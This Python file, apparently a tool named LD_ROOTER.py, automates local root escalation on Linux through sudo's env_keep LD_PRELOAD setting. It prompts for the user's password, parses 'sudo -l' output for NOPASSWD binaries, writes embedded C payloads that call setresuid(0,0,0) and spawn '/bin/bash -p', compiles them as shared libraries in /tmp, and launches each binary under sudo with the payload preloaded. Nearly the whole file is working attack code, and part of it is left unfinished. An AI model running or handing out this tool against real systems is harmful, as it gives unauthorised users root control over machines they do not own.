import subprocess
import os
import shutil
import re

def get_library(binary_path):
    # Return all libraries names
    output = subprocess.run(['ldd', binary_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    library = output.stdout.strip().split('\n')
    new_names = []
    for lib in library:
        parts = lib.strip().split('.so')
        for part in parts:
            part = part.strip()
            filename = os.path.basename(part)
            if filename and "0x" not in filename:
                clean_name = filename + '.so'
                new_names.append(clean_name)

    unique_lib_names = []
    for item in new_names:
        if item not in unique_lib_names:
            unique_lib_names.append(item)
    return unique_lib_names

def get_binary_path(binary):
    # return full path of binary (which command ki tarah)
    return shutil.which(binary.strip())


def get_binaries(sudo_output):
    paths = re.findall(r'NOPASSWD:\s*([^\s]+)', sudo_output)
    final_names = []
    for path in paths:
        b_name = os.path.basename(path)
        try:
            final_name = shutil.which(path.strip())
            final_names.append(final_name)
        except Exception as e:
            print(e)

    return final_names

def check_gcc():
    return shutil.which("gcc".strip())

if not check_gcc():
    print("[!] LD_ROOTER.py requires 'gcc' to run")
    print("[!] Exiting program...")
    exit()

preload_program = """
#define _GNU_SOURCE 
#include <stdio.h> 
#include <unistd.h> 
#include <sys/types.h> 
#include <stdlib.h> 

void _init() { 
unsetenv("LD_PRELOAD"); // Remove LD_PRELOAD to prevent other libraries from loading 
setresuid(0,0,0); // Set user ID to 0 (root) 
system("/bin/bash -p"); // Execute shell with root privileges 
} 
"""

library_path_program = """
#include <stdio.h> 
#include <stdlib.h> 

static void hijack() __attribute__((constructor)); 

void hijack() { 
unsetenv("LD_LIBRARY_PATH"); 
setresuid(0,0,0); 
system("/bin/bash -p"); 
} """

password = input("Enter the password: ")
#
proc = subprocess.Popen(["sudo", "-S", "-l"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
stdout, stderr = proc.communicate(password + '\n')

sudo_output = stdout

if "env_keep+=LD_PRELOAD" in sudo_output:
    print("\n[+] sudo allow 'LD_PRELOAD' injection")
    binaries = get_binaries(sudo_output)

    for binary in binaries:
        libs = get_library(binary)
        if libs:
            for lib in libs:
                print(f"[+] Using binary : {binary}")
                with open('/tmp/preload.c', 'w') as f:
                    f.write(preload_program)
                print(f"[+] Trying '{lib}' file...")
                subprocess.run(['gcc', '-fPIC', '-shared', '-nostartfiles', '/tmp/preload.c', '-o', f'/tmp/{lib}'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                try:
                    print(f"[+] Opening root shell...")
                    os.system(f'sudo LD_PRELOAD=/tmp/{lib} {binary}')
                    exit()
                except Exception as e:
                    print(f"[!] Error occurred: {e}")
                finally:
                    if os.path.exists(f"/tmp/{lib}"):
                        print(f"[+] Cleaning previous '{lib}' file...\n")
                        os.remove(f"/tmp/{lib}")


# elif "env_keep+=LD_PRELOAD" in sudo_output:
    # check ld preload or ld prepath

# for lib in get_library(binary):

